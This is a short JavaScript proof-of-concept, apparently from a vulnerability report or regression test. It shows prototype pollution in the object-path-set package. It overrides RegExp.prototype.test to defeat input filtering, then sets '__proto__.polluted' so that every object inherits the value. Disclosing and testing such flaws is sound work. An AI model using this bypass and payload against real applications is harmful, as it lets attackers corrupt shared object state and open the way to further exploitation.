RegExp.prototype.test = () => true;
const setPath = require('object-path-set');
var obj = {};
console.log({}.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');